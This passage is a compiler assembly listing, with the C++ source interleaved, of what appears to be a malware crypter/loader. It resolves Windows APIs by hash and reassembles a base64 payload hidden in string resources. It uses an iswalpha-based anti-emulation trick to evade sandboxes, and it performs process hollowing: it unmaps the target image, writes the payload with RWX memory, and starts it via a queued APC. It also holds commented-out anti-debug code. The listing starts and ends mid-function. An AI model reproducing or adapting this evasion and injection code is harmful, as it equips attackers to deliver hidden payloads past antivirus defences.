; 935  : 	Result = NT_SUCCESS(x_NtUnmapViewOfSection(PI.hProcess, (LPVOID)ImageBase));

	mov	edx, DWORD PTR _ImageBase$[ebp]
	push	edx
	mov	eax, DWORD PTR _PI$[ebp]
	push	eax
	call	DWORD PTR ?x_NtUnmapViewOfSection@@3P6GJPAX0@ZA ; x_NtUnmapViewOfSection
	test	eax, eax
	jl	SHORT $LN13@loader_loa
	mov	DWORD PTR tv153[ebp], 1
	jmp	SHORT $LN14@loader_loa
$LN13@loader_loa:
	mov	DWORD PTR tv153[ebp], 0
$LN14@loader_loa:
	mov	ecx, DWORD PTR tv153[ebp]
	mov	DWORD PTR _Result$[ebp], ecx

; 936  : 
; 937  : 	DWORD dwAllocationAttempts = 5;

	mov	DWORD PTR _dwAllocationAttempts$[ebp], 5

; 938  : 	LPVOID lpAllocatedImageBase = 0;

	mov	DWORD PTR _lpAllocatedImageBase$[ebp], 0
$LN8@loader_loa:

; 939  : 
; 940  : 	do {
; 941  : 
; 942  : 		x_NtAllocateVirtualMemory = reinterpret_cast<API_DEFINES::t_NtAllocateVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtAllocateVirtualMemory));

	mov	edx, DWORD PTR ?hash_NtAllocateVirtualMemory@@3KC ; hash_NtAllocateVirtualMemory
	push	edx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtAllocateVirtualMemory@@3P6GJPAXPAPAXKPAKKK@ZA, eax ; x_NtAllocateVirtualMemory

; 943  : 
; 944  : 		LPVOID lpImageBase = (LPVOID)ImageBase;

	mov	eax, DWORD PTR _ImageBase$[ebp]
	mov	DWORD PTR _lpImageBase$5[ebp], eax

; 945  : 		DWORD dwImageSize = pPayloadNtHeaders->OptionalHeader.SizeOfImage;

	mov	ecx, DWORD PTR _pPayloadNtHeaders$[ebp]
	mov	edx, DWORD PTR [ecx+80]
	mov	DWORD PTR _dwImageSize$2[ebp], edx

; 946  : 
; 947  : 		Result = NT_SUCCESS(x_NtAllocateVirtualMemory(PI.hProcess, &lpImageBase, NULL, &dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

	push	64					; 00000040H
	push	12288					; 00003000H
	lea	eax, DWORD PTR _dwImageSize$2[ebp]
	push	eax
	push	0
	lea	ecx, DWORD PTR _lpImageBase$5[ebp]
	push	ecx
	mov	edx, DWORD PTR _PI$[ebp]
	push	edx
	call	DWORD PTR ?x_NtAllocateVirtualMemory@@3P6GJPAXPAPAXKPAKKK@ZA ; x_NtAllocateVirtualMemory
	test	eax, eax
	jl	SHORT $LN15@loader_loa
	mov	DWORD PTR tv168[ebp], 1
	jmp	SHORT $LN16@loader_loa
$LN15@loader_loa:
	mov	DWORD PTR tv168[ebp], 0
$LN16@loader_loa:
	mov	eax, DWORD PTR tv168[ebp]
	mov	DWORD PTR _Result$[ebp], eax

; 948  : 
; 949  : 		if (Result) {

	cmp	DWORD PTR _Result$[ebp], 0
	je	SHORT $LN5@loader_loa

; 950  : 			lpAllocatedImageBase = lpImageBase;

	mov	ecx, DWORD PTR _lpImageBase$5[ebp]
	mov	DWORD PTR _lpAllocatedImageBase$[ebp], ecx

; 951  : 			break;

	jmp	SHORT $LN6@loader_loa
$LN5@loader_loa:

; 952  : 		}
; 953  : 
; 954  : 		if (!Result && dwAllocationAttempts) {

	cmp	DWORD PTR _Result$[ebp], 0
	jne	SHORT $LN7@loader_loa
	cmp	DWORD PTR _dwAllocationAttempts$[ebp], 0
	je	SHORT $LN7@loader_loa

; 955  : 			dwAllocationAttempts--;

	mov	edx, DWORD PTR _dwAllocationAttempts$[ebp]
	sub	edx, 1
	mov	DWORD PTR _dwAllocationAttempts$[ebp], edx
$LN7@loader_loa:

; 956  : 			continue;
; 957  : 		}
; 958  : 
; 959  : 	} while (dwAllocationAttempts);

	cmp	DWORD PTR _dwAllocationAttempts$[ebp], 0
	jne	$LN8@loader_loa
$LN6@loader_loa:

; 960  : 
; 961  : 	x_NtWriteVirtualMemory = reinterpret_cast<API_DEFINES::t_NtWriteVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtWriteVirtualMemory));

	mov	eax, DWORD PTR ?hash_NtWriteVirtualMemory@@3KC ; hash_NtWriteVirtualMemory
	push	eax
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtWriteVirtualMemory@@3P6GJPAX00KPAK@ZA, eax ; x_NtWriteVirtualMemory

; 962  : 	x_NtProtectVirtualMemory = reinterpret_cast<API_DEFINES::t_NtProtectVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtProtectVirtualMemory));

	mov	ecx, DWORD PTR ?hash_NtProtectVirtualMemory@@3KC ; hash_NtProtectVirtualMemory
	push	ecx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtProtectVirtualMemory@@3P6GJPAXPAPAXPAKK2@ZA, eax ; x_NtProtectVirtualMemory

; 963  : 
; 964  : 	Result = NT_SUCCESS(x_NtWriteVirtualMemory(PI.hProcess, (LPVOID)ImageBase, lpExeBuffer, pPayloadNtHeaders->OptionalHeader.SizeOfHeaders, NULL));

	push	0
	mov	edx, DWORD PTR _pPayloadNtHeaders$[ebp]
	mov	eax, DWORD PTR [edx+84]
	push	eax
	mov	ecx, DWORD PTR _lpExeBuffer$[ebp]
	push	ecx
	mov	edx, DWORD PTR _ImageBase$[ebp]
	push	edx
	mov	eax, DWORD PTR _PI$[ebp]
	push	eax
	call	DWORD PTR ?x_NtWriteVirtualMemory@@3P6GJPAX00KPAK@ZA ; x_NtWriteVirtualMemory
	test	eax, eax
	jl	SHORT $LN17@loader_loa
	mov	DWORD PTR tv191[ebp], 1
	jmp	SHORT $LN18@loader_loa
$LN17@loader_loa:
	mov	DWORD PTR tv191[ebp], 0
$LN18@loader_loa:
	mov	ecx, DWORD PTR tv191[ebp]
	mov	DWORD PTR _Result$[ebp], ecx

; 965  : 
; 966  : 	PIMAGE_SECTION_HEADER pISH = IMAGE_FIRST_SECTION(pPayloadNtHeaders);

	mov	edx, DWORD PTR _pPayloadNtHeaders$[ebp]
	movzx	eax, WORD PTR [edx+20]
	mov	ecx, DWORD PTR _pPayloadNtHeaders$[ebp]
	lea	edx, DWORD PTR [ecx+eax+24]
	mov	DWORD PTR _pISH$[ebp], edx

; 967  : 
; 968  : 	for (size_t i = 0; i < pPayloadNtHeaders->FileHeader.NumberOfSections; i++) {

	mov	DWORD PTR _i$6[ebp], 0
	jmp	SHORT $LN3@loader_loa
$LN2@loader_loa:
	mov	eax, DWORD PTR _i$6[ebp]
	add	eax, 1
	mov	DWORD PTR _i$6[ebp], eax
$LN3@loader_loa:
	mov	ecx, DWORD PTR _pPayloadNtHeaders$[ebp]
	movzx	edx, WORD PTR [ecx+6]
	cmp	DWORD PTR _i$6[ebp], edx
	jae	$LN1@loader_loa

; 969  : 
; 970  : 		//if (!pISH->SizeOfRawData) {
; 971  : 		//	continue; // virtual section?
; 972  : 		//}
; 973  : 
; 974  : 		Result = NT_SUCCESS(x_NtWriteVirtualMemory(PI.hProcess, (LPVOID)(ImageBase + pISH->VirtualAddress), (LPVOID)((DWORD)lpExeBuffer + pISH->PointerToRawData), pISH->SizeOfRawData, NULL));

	push	0
	mov	eax, DWORD PTR _pISH$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	push	ecx
	mov	edx, DWORD PTR _pISH$[ebp]
	mov	eax, DWORD PTR _lpExeBuffer$[ebp]
	add	eax, DWORD PTR [edx+20]
	push	eax
	mov	ecx, DWORD PTR _pISH$[ebp]
	mov	edx, DWORD PTR _ImageBase$[ebp]
	add	edx, DWORD PTR [ecx+12]
	push	edx
	mov	eax, DWORD PTR _PI$[ebp]
	push	eax
	call	DWORD PTR ?x_NtWriteVirtualMemory@@3P6GJPAX00KPAK@ZA ; x_NtWriteVirtualMemory
	test	eax, eax
	jl	SHORT $LN19@loader_loa
	mov	DWORD PTR tv214[ebp], 1
	jmp	SHORT $LN20@loader_loa
$LN19@loader_loa:
	mov	DWORD PTR tv214[ebp], 0
$LN20@loader_loa:
	mov	ecx, DWORD PTR tv214[ebp]
	mov	DWORD PTR _Result$[ebp], ecx

; 975  : 
; 976  : 		LPVOID lpProtectAddress = (LPVOID)(ImageBase + pISH->VirtualAddress);

	mov	edx, DWORD PTR _pISH$[ebp]
	mov	eax, DWORD PTR _ImageBase$[ebp]
	add	eax, DWORD PTR [edx+12]
	mov	DWORD PTR _lpProtectAddress$3[ebp], eax

; 977  : 		DWORD dwProtectSize = pISH->Misc.VirtualSize;

	mov	ecx, DWORD PTR _pISH$[ebp]
	mov	edx, DWORD PTR [ecx+8]
	mov	DWORD PTR _dwProtectSize$4[ebp], edx

; 978  : 		DWORD dwOld = 0;

	mov	DWORD PTR _dwOld$1[ebp], 0

; 979  : 
; 980  : 		Result = NT_SUCCESS(x_NtProtectVirtualMemory(PI.hProcess, &lpProtectAddress, &dwProtectSize, GetSectionProtection(pISH->Characteristics), &dwOld));

	lea	eax, DWORD PTR _dwOld$1[ebp]
	push	eax
	mov	ecx, DWORD PTR _pISH$[ebp]
	mov	edx, DWORD PTR [ecx+36]
	push	edx
	call	?GetSectionProtection@@YAKK@Z		; GetSectionProtection
	add	esp, 4
	push	eax
	lea	eax, DWORD PTR _dwProtectSize$4[ebp]
	push	eax
	lea	ecx, DWORD PTR _lpProtectAddress$3[ebp]
	push	ecx
	mov	edx, DWORD PTR _PI$[ebp]
	push	edx
	call	DWORD PTR ?x_NtProtectVirtualMemory@@3P6GJPAXPAPAXPAKK2@ZA ; x_NtProtectVirtualMemory
	test	eax, eax
	jl	SHORT $LN21@loader_loa
	mov	DWORD PTR tv229[ebp], 1
	jmp	SHORT $LN22@loader_loa
$LN21@loader_loa:
	mov	DWORD PTR tv229[ebp], 0
$LN22@loader_loa:
	mov	eax, DWORD PTR tv229[ebp]
	mov	DWORD PTR _Result$[ebp], eax

; 981  : 
; 982  : 		pISH++;

	mov	ecx, DWORD PTR _pISH$[ebp]
	add	ecx, 40					; 00000028H
	mov	DWORD PTR _pISH$[ebp], ecx

; 983  : 	}

	jmp	$LN2@loader_loa
$LN1@loader_loa:

; 984  : 
; 985  : 	CTX.Eax = (DWORD)(ImageBase + pPayloadNtHeaders->OptionalHeader.AddressOfEntryPoint);

	mov	edx, DWORD PTR _pPayloadNtHeaders$[ebp]
	mov	eax, DWORD PTR _ImageBase$[ebp]
	add	eax, DWORD PTR [edx+40]
	mov	DWORD PTR _CTX$[ebp+176], eax

; 986  : 
; 987  : 	x_NtQueueApcThread = reinterpret_cast<API_DEFINES::t_NtQueueApcThread>(load_func(MODULE_BASE::NTDLL, hash_NtQueueApcThread));

	mov	ecx, DWORD PTR ?hash_NtQueueApcThread@@3KC ; hash_NtQueueApcThread
	push	ecx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtQueueApcThread@@3P6GJPAXP6GX0PAU_IO_STATUS_BLOCK@API_DEFINES@@K@Z01K@ZA, eax ; x_NtQueueApcThread

; 988  : 	Result = NT_SUCCESS(x_NtQueueApcThread(PI.hThread, (API_DEFINES::PIO_APC_ROUTINE)CTX.Eax, NULL, NULL, NULL));

	push	0
	push	0
	push	0
	mov	edx, DWORD PTR _CTX$[ebp+176]
	push	edx
	mov	eax, DWORD PTR _PI$[ebp+4]
	push	eax
	call	DWORD PTR ?x_NtQueueApcThread@@3P6GJPAXP6GX0PAU_IO_STATUS_BLOCK@API_DEFINES@@K@Z01K@ZA ; x_NtQueueApcThread
	test	eax, eax
	jl	SHORT $LN23@loader_loa
	mov	DWORD PTR tv245[ebp], 1
	jmp	SHORT $LN24@loader_loa
$LN23@loader_loa:
	mov	DWORD PTR tv245[ebp], 0
$LN24@loader_loa:
	mov	ecx, DWORD PTR tv245[ebp]
	mov	DWORD PTR _Result$[ebp], ecx

; 989  : 
; 990  : 	x_NtAlertResumeThread = reinterpret_cast<API_DEFINES::t_NtAlertResumeThread>(load_func(MODULE_BASE::NTDLL, hash_NtAlertResumeThread));

	mov	edx, DWORD PTR ?hash_NtAlertResumeThread@@3KC ; hash_NtAlertResumeThread
	push	edx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtAlertResumeThread@@3P6GJPAXPAK@ZA, eax ; x_NtAlertResumeThread

; 991  : 
; 992  : 	DWORD dwSuspendCount = 0;

	mov	DWORD PTR _dwSuspendCount$[ebp], 0

; 993  : 	Result = NT_SUCCESS(x_NtAlertResumeThread(PI.hThread, &dwSuspendCount));

	lea	eax, DWORD PTR _dwSuspendCount$[ebp]
	push	eax
	mov	ecx, DWORD PTR _PI$[ebp+4]
	push	ecx
	call	DWORD PTR ?x_NtAlertResumeThread@@3P6GJPAXPAK@ZA ; x_NtAlertResumeThread
	test	eax, eax
	jl	SHORT $LN25@loader_loa
	mov	DWORD PTR tv254[ebp], 1
	jmp	SHORT $LN26@loader_loa
$LN25@loader_loa:
	mov	DWORD PTR tv254[ebp], 0
$LN26@loader_loa:
	mov	edx, DWORD PTR tv254[ebp]
	mov	DWORD PTR _Result$[ebp], edx

; 994  : 
; 995  : 	/*x_NtSetContextThread = reinterpret_cast<API_DEFINES::t_NtSetContextThread>(load_func(MODULE_BASE::NTDLL, hash_NtSetContextThread));
; 996  : 	x_NtSetContextThread(PI.hThread, &CTX);
; 997  : 
; 998  : 	x_NtResumeThread = reinterpret_cast<API_DEFINES::t_NtResumeThread>(load_func(MODULE_BASE::NTDLL, hash_NtResumeThread));
; 999  : 	x_NtResumeThread(PI.hThread, nullptr);*/
; 1000 : 
; 1001 : 	// Anti-Debug
; 1002 : 	/*DebugActiveProcess(PI.dwProcessId);
; 1003 : 	DEBUG_EVENT de = { 0 };
; 1004 : 
; 1005 : 	while (true) {
; 1006 : 
; 1007 : 	WaitForDebugEvent(&de, INFINITE);
; 1008 : 
; 1009 : 	DWORD dwContinueFlag = DBG_CONTINUE;
; 1010 : 
; 1011 : 	if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
; 1012 : 	dwContinueFlag = DBG_EXCEPTION_NOT_HANDLED;
; 1013 : 	}
; 1014 : 
; 1015 : 	ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueFlag);
; 1016 : 	}*/
; 1017 : }

	mov	esp, ebp
	pop	ebp
	ret	0
?loader_load_pe@@YAXPAXK@Z ENDP				; loader_load_pe
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
;	COMDAT ?GetSectionProtection@@YAKK@Z
_TEXT	SEGMENT
_dwResult$ = -4						; size = 4
_sc$ = 8						; size = 4
?GetSectionProtection@@YAKK@Z PROC			; GetSectionProtection, COMDAT

; 876  : DWORD __inline GetSectionProtection(DWORD sc) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 877  : 	DWORD dwResult = 0;

	mov	DWORD PTR _dwResult$[ebp], 0

; 878  : 	if (sc & IMAGE_SCN_MEM_NOT_CACHED) dwResult |= PAGE_NOCACHE;

	mov	eax, DWORD PTR _sc$[ebp]
	and	eax, 67108864				; 04000000H
	je	SHORT $LN15@GetSection
	mov	ecx, DWORD PTR _dwResult$[ebp]
	or	ecx, 512				; 00000200H
	mov	DWORD PTR _dwResult$[ebp], ecx
$LN15@GetSection:

; 879  : 	if (sc & IMAGE_SCN_MEM_EXECUTE) {

	mov	edx, DWORD PTR _sc$[ebp]
	and	edx, 536870912				; 20000000H
	je	SHORT $LN14@GetSection

; 880  : 		if (sc & IMAGE_SCN_MEM_READ) {

	mov	eax, DWORD PTR _sc$[ebp]
	and	eax, 1073741824				; 40000000H
	je	SHORT $LN13@GetSection

; 881  : 			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_READWRITE;	else	dwResult |= PAGE_EXECUTE_READ;

	mov	ecx, DWORD PTR _sc$[ebp]
	and	ecx, -2147483648			; 80000000H
	je	SHORT $LN12@GetSection
	mov	edx, DWORD PTR _dwResult$[ebp]
	or	edx, 64					; 00000040H
	mov	DWORD PTR _dwResult$[ebp], edx
	jmp	SHORT $LN11@GetSection
$LN12@GetSection:
	mov	eax, DWORD PTR _dwResult$[ebp]
	or	eax, 32					; 00000020H
	mov	DWORD PTR _dwResult$[ebp], eax
$LN11@GetSection:

; 882  : 		}
; 883  : 		else {

	jmp	SHORT $LN10@GetSection
$LN13@GetSection:

; 884  : 			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_WRITECOPY;	else	dwResult |= PAGE_EXECUTE;

	mov	ecx, DWORD PTR _sc$[ebp]
	and	ecx, -2147483648			; 80000000H
	je	SHORT $LN9@GetSection
	mov	edx, DWORD PTR _dwResult$[ebp]
	or	edx, 128				; 00000080H
	mov	DWORD PTR _dwResult$[ebp], edx
	jmp	SHORT $LN10@GetSection
$LN9@GetSection:
	mov	eax, DWORD PTR _dwResult$[ebp]
	or	eax, 16					; 00000010H
	mov	DWORD PTR _dwResult$[ebp], eax
$LN10@GetSection:

; 885  : 		}
; 886  : 	}
; 887  : 	else {

	jmp	SHORT $LN7@GetSection
$LN14@GetSection:

; 888  : 		if (sc & IMAGE_SCN_MEM_READ) {

	mov	ecx, DWORD PTR _sc$[ebp]
	and	ecx, 1073741824				; 40000000H
	je	SHORT $LN6@GetSection

; 889  : 			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_READWRITE;	else dwResult |= PAGE_READONLY;

	mov	edx, DWORD PTR _sc$[ebp]
	and	edx, -2147483648			; 80000000H
	je	SHORT $LN5@GetSection
	mov	eax, DWORD PTR _dwResult$[ebp]
	or	eax, 4
	mov	DWORD PTR _dwResult$[ebp], eax
	jmp	SHORT $LN4@GetSection
$LN5@GetSection:
	mov	ecx, DWORD PTR _dwResult$[ebp]
	or	ecx, 2
	mov	DWORD PTR _dwResult$[ebp], ecx
$LN4@GetSection:

; 890  : 		}
; 891  : 		else {

	jmp	SHORT $LN7@GetSection
$LN6@GetSection:

; 892  : 			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_WRITECOPY;	else dwResult |= PAGE_NOACCESS;

	mov	edx, DWORD PTR _sc$[ebp]
	and	edx, -2147483648			; 80000000H
	je	SHORT $LN2@GetSection
	mov	eax, DWORD PTR _dwResult$[ebp]
	or	eax, 8
	mov	DWORD PTR _dwResult$[ebp], eax
	jmp	SHORT $LN7@GetSection
$LN2@GetSection:
	mov	ecx, DWORD PTR _dwResult$[ebp]
	or	ecx, 1
	mov	DWORD PTR _dwResult$[ebp], ecx
$LN7@GetSection:

; 893  : 		}
; 894  : 	}
; 895  : 	return dwResult;

	mov	eax, DWORD PTR _dwResult$[ebp]

; 896  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?GetSectionProtection@@YAKK@Z ENDP			; GetSectionProtection
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_pINH$ = -64						; size = 4
_dwXPressSize$ = -60					; size = 4
_dwSize$ = -56						; size = 4
_lpExitProcess$1 = -52					; size = 4
_lpIsWalpha$ = -48					; size = 4
_pLastSection$ = -44					; size = 4
_pIDH$ = -40						; size = 4
_lpResource$2 = -36					; size = 4
_lpResourceData$3 = -32					; size = 4
_hResource$4 = -28					; size = 4
_hResource$5 = -24					; size = 4
_dwNewSize$ = -20					; size = 4
_ecx_value$ = -16					; size = 4
_dwChunkSize$ = -12					; size = 4
_x$ = -8						; size = 4
_lpReturnBuffer$ = -4					; size = 4
_dwFileLenOut$ = 8					; size = 4
?loader_load_res@@YAPAXPAK@Z PROC			; loader_load_res

; 785  : LPVOID loader_load_res(DWORD* dwFileLenOut) {

	push	ebp
	mov	ebp, esp
	sub	esp, 64					; 00000040H

; 786  : 
; 787  : 	DWORD x = 1;

	mov	DWORD PTR _x$[ebp], 1

; 788  : 	DWORD dwChunkSize = 0;

	mov	DWORD PTR _dwChunkSize$[ebp], 0

; 789  : 
; 790  : 	LPVOID lpReturnBuffer = NULL;

	mov	DWORD PTR _lpReturnBuffer$[ebp], 0

; 791  : 
; 792  : 	x_FindResourceW = reinterpret_cast<API_DEFINES::t_FindResourceW>(load_func(MODULE_BASE::KERNEL32, hash_FindResourceW));

	mov	eax, DWORD PTR ?hash_FindResourceW@@3KC	; hash_FindResourceW
	push	eax
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_FindResourceW@@3P6GPAUHRSRC__@@PAUHINSTANCE__@@PA_W1@ZA, eax ; x_FindResourceW
$LN12@loader_loa:

; 793  : 	while (HRSRC hResource = x_FindResourceW(NULL, (wchar_t*)x, (wchar_t*)RT_STRING)) {

	push	6
	mov	ecx, DWORD PTR _x$[ebp]
	push	ecx
	push	0
	call	DWORD PTR ?x_FindResourceW@@3P6GPAUHRSRC__@@PAUHINSTANCE__@@PA_W1@ZA ; x_FindResourceW
	mov	DWORD PTR _hResource$5[ebp], eax
	cmp	DWORD PTR _hResource$5[ebp], 0
	je	SHORT $LN11@loader_loa

; 794  : 
; 795  : 		if (x == 1) {

	cmp	DWORD PTR _x$[ebp], 1
	jne	SHORT $LN10@loader_loa

; 796  : 			x_SizeofResource = reinterpret_cast<API_DEFINES::t_SizeofResource>(load_func(MODULE_BASE::KERNEL32, hash_SizeofResource));

	mov	edx, DWORD PTR ?hash_SizeofResource@@3KC ; hash_SizeofResource
	push	edx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_SizeofResource@@3P6GKPAUHINSTANCE__@@PAUHRSRC__@@@ZA, eax ; x_SizeofResource

; 797  : 			dwChunkSize = x_SizeofResource(NULL, hResource);

	mov	eax, DWORD PTR _hResource$5[ebp]
	push	eax
	push	0
	call	DWORD PTR ?x_SizeofResource@@3P6GKPAUHINSTANCE__@@PAUHRSRC__@@@ZA ; x_SizeofResource
	mov	DWORD PTR _dwChunkSize$[ebp], eax
$LN10@loader_loa:

; 798  : 		}
; 799  : 
; 800  : 		x++;

	mov	ecx, DWORD PTR _x$[ebp]
	add	ecx, 1
	mov	DWORD PTR _x$[ebp], ecx

; 801  : 	}

	jmp	SHORT $LN12@loader_loa
$LN11@loader_loa:

; 802  : 
; 803  : 	x_VirtualAlloc = reinterpret_cast<API_DEFINES::t_VirtualAlloc>(load_func(MODULE_BASE::KERNEL32, hash_VirtualAlloc));

	mov	edx, DWORD PTR ?hash_VirtualAlloc@@3KC	; hash_VirtualAlloc
	push	edx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA, eax ; x_VirtualAlloc

; 804  : 	lpReturnBuffer = x_VirtualAlloc(NULL, dwChunkSize * (x - 1), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	push	4
	push	12288					; 00003000H
	mov	eax, DWORD PTR _x$[ebp]
	sub	eax, 1
	imul	eax, DWORD PTR _dwChunkSize$[ebp]
	push	eax
	push	0
	call	DWORD PTR ?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA ; x_VirtualAlloc
	mov	DWORD PTR _lpReturnBuffer$[ebp], eax

; 805  : 
; 806  : 	if (lpReturnBuffer) {

	cmp	DWORD PTR _lpReturnBuffer$[ebp], 0
	je	$LN9@loader_loa

; 807  : 
; 808  : 		x = 1;

	mov	DWORD PTR _x$[ebp], 1
$LN8@loader_loa:

; 809  : 
; 810  : 		while (HRSRC hResource = x_FindResourceW(NULL, (wchar_t*)x, (wchar_t*)RT_STRING)) {

	push	6
	mov	ecx, DWORD PTR _x$[ebp]
	push	ecx
	push	0
	call	DWORD PTR ?x_FindResourceW@@3P6GPAUHRSRC__@@PAUHINSTANCE__@@PA_W1@ZA ; x_FindResourceW
	mov	DWORD PTR _hResource$4[ebp], eax
	cmp	DWORD PTR _hResource$4[ebp], 0
	je	$LN9@loader_loa

; 811  : 
; 812  : 			x_LoadResource = reinterpret_cast<API_DEFINES::t_LoadResource>(load_func(MODULE_BASE::KERNEL32, hash_LoadResource));

	mov	edx, DWORD PTR ?hash_LoadResource@@3KC	; hash_LoadResource
	push	edx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_LoadResource@@3P6GPAXPAUHINSTANCE__@@PAUHRSRC__@@@ZA, eax ; x_LoadResource

; 813  : 			HGLOBAL lpResourceData = x_LoadResource(NULL, hResource);

	mov	eax, DWORD PTR _hResource$4[ebp]
	push	eax
	push	0
	call	DWORD PTR ?x_LoadResource@@3P6GPAXPAUHINSTANCE__@@PAUHRSRC__@@@ZA ; x_LoadResource
	mov	DWORD PTR _lpResourceData$3[ebp], eax

; 814  : 
; 815  : 			if (lpResourceData) {

	cmp	DWORD PTR _lpResourceData$3[ebp], 0
	je	SHORT $LN6@loader_loa

; 816  : 
; 817  : 				x_LockResource = reinterpret_cast<API_DEFINES::t_LockResource>(load_func(MODULE_BASE::KERNEL32, hash_LockResource));

	mov	ecx, DWORD PTR ?hash_LockResource@@3KC	; hash_LockResource
	push	ecx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_LockResource@@3P6GPAXPAX@ZA, eax ; x_LockResource

; 818  : 				LPVOID lpResource = x_LockResource(lpResourceData);

	mov	edx, DWORD PTR _lpResourceData$3[ebp]
	push	edx
	call	DWORD PTR ?x_LockResource@@3P6GPAXPAX@ZA ; x_LockResource
	mov	DWORD PTR _lpResource$2[ebp], eax

; 819  : 
; 820  : 				if (lpResource) {

	cmp	DWORD PTR _lpResource$2[ebp], 0
	je	SHORT $LN6@loader_loa

; 821  : 
; 822  : 					m_memcpy((LPVOID)((DWORD)lpReturnBuffer + (dwChunkSize * (x - 1))), lpResource, dwChunkSize);

	mov	eax, DWORD PTR _dwChunkSize$[ebp]
	push	eax
	mov	ecx, DWORD PTR _lpResource$2[ebp]
	push	ecx
	mov	edx, DWORD PTR _x$[ebp]
	sub	edx, 1
	imul	edx, DWORD PTR _dwChunkSize$[ebp]
	add	edx, DWORD PTR _lpReturnBuffer$[ebp]
	push	edx
	call	?m_memcpy@@YAPAXPAXPBXH@Z		; m_memcpy
	add	esp, 12					; 0000000cH

; 823  : 					x++;

	mov	eax, DWORD PTR _x$[ebp]
	add	eax, 1
	mov	DWORD PTR _x$[ebp], eax
$LN6@loader_loa:

; 824  : 				}
; 825  : 			}
; 826  : 		}

	jmp	$LN8@loader_loa
$LN9@loader_loa:

; 827  : 	}
; 828  : 
; 829  : 	// Anti Emulation 1:
; 830  : 	// iswalpha (Random) 
; 831  : 	// ecx = 0x103
; 832  : 
; 833  : 	LPVOID lpIsWalpha = load_func(MODULE_BASE::NTDLL, hash_iswalpha);

	mov	ecx, DWORD PTR ?hash_iswalpha@@3KC	; hash_iswalpha
	push	ecx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpIsWalpha$[ebp], eax

; 834  : 	DWORD ecx_value = 0;

	mov	DWORD PTR _ecx_value$[ebp], 0

; 835  : 
; 836  : 	__asm	{
; 837  : 		push 0xAA4D83

	push	11160963				; 00aa4d83H

; 838  : 			mov eax, lpIsWalpha

	mov	eax, DWORD PTR _lpIsWalpha$[ebp]

; 839  : 			call eax

	call	eax

; 840  : 			mov ecx_value, ecx

	mov	DWORD PTR _ecx_value$[ebp], ecx

; 841  : 	}
; 842  : 
; 843  : 	if (ecx_value != 0x103) {

	cmp	DWORD PTR _ecx_value$[ebp], 259		; 00000103H
	je	SHORT $LN4@loader_loa

; 844  : 
; 845  : 		LPVOID lpExitProcess = load_func(MODULE_BASE::KERNEL32, hash_ExitProcess);

	mov	edx, DWORD PTR ?hash_ExitProcess@@3KC	; hash_ExitProcess
	push	edx
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpExitProcess$1[ebp], eax
$LN3@loader_loa:

; 846  : 
; 847  : 		while (ecx_value != 0x103) {

	cmp	DWORD PTR _ecx_value$[ebp], 259		; 00000103H
	je	SHORT $LN4@loader_loa

; 848  : 			__asm{
; 849  : 				push 0x103

	push	259					; 00000103H

; 850  : 					mov eax, lpExitProcess

	mov	eax, DWORD PTR _lpExitProcess$1[ebp]

; 851  : 					call eax

	call	eax

; 852  : 			}
; 853  : 		}

	jmp	SHORT $LN3@loader_loa
$LN4@loader_loa:

; 854  : 	}
; 855  : 
; 856  : 	DWORD dwNewSize = 0;

	mov	DWORD PTR _dwNewSize$[ebp], 0

; 857  : 	DWORD dwXPressSize = 0;

	mov	DWORD PTR _dwXPressSize$[ebp], 0

; 858  : 	DWORD dwSize = (dwChunkSize * (x - 1));

	mov	eax, DWORD PTR _x$[ebp]
	sub	eax, 1
	imul	eax, DWORD PTR _dwChunkSize$[ebp]
	mov	DWORD PTR _dwSize$[ebp], eax

; 859  : 
; 860  : 	lpReturnBuffer = base64Decode((char*)lpReturnBuffer, dwSize, &dwNewSize);

	lea	ecx, DWORD PTR _dwNewSize$[ebp]
	push	ecx
	mov	edx, DWORD PTR _dwSize$[ebp]
	push	edx
